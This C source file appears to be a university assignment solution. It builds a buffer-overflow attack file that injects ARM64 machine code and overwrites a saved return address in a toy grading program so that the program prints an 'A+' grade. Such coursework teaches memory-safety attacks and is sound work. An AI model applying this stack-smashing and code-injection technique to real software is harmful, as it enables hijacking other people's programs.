/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Ariel Yuan, Grace Best.                                    */
/* Purpose: Produces a file called dataAplus with the student name,   */
/* a nullbyte, the character A, a null byte, malicious instructions in*/ 
/* machine code to get an A+, padding to overrun the stack,           */
/* and the address of the malicious instruction in the                */
/* 6th array element of name[] to get an A+, the ladder of which      */
/* will overwrite getName's stored x30.                               */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

/* Writes to file dataAplus the name of student, the null byte, the
    character A, the machine code version of malicious instructions
    to get an A+, padding to overrun the stack, and the address of 
    the array element holding the first malicious instruction.
    Returns 0. */

FILE *psFILE;
int main(void)
{
    int i; /*initializes for loop counter*/
    unsigned int ulData;  /* Machine code instructions */
    unsigned long addr = 0x420060;  /* Address of A instruction */

    psFILE = fopen("dataAplus", "w");
    fprintf(psFILE, "Grace");   /* Write student name to file */
    fprintf(psFILE, "%c", '\0');     /* Write null byte after name */
    fprintf(psFILE, "A");     /* Add grade we (sort of) want */
    fprintf(psFILE, "%c", '\0');    /* Write null byte */

    /* adr x0, name[6] */
    ulData = MiniAssembler_adr(0, 0x42005e, addr);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /*bl 0x400690 <printf@plt>*/
    ulData = MiniAssembler_bl(0x400690, addr + 4);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* mov x1, '+' */
    ulData = MiniAssembler_mov(1, '+');
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* adr x0, "%c is your grade.\n" */
    ulData = MiniAssembler_adr(0, 0x400920, addr + 12);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
    
    /*bl 0x400690 <printf@plt>*/
    ulData = MiniAssembler_bl(0x400690, addr + 16);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* b 0x4008b0 */
    ulData = MiniAssembler_b(0x4008b0, addr + 20);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* Write padding of 16 characters to overrun stack */
    for (i = 0; i < 16; i++)
    {
        fprintf(psFILE, "%c", '\0');
    }
    /* Overwrite getName's stored x30 w/ instruction to get an A+ */
    fwrite(&addr, sizeof(unsigned long), 1, psFILE);


    fclose(psFILE);
    return 0;
}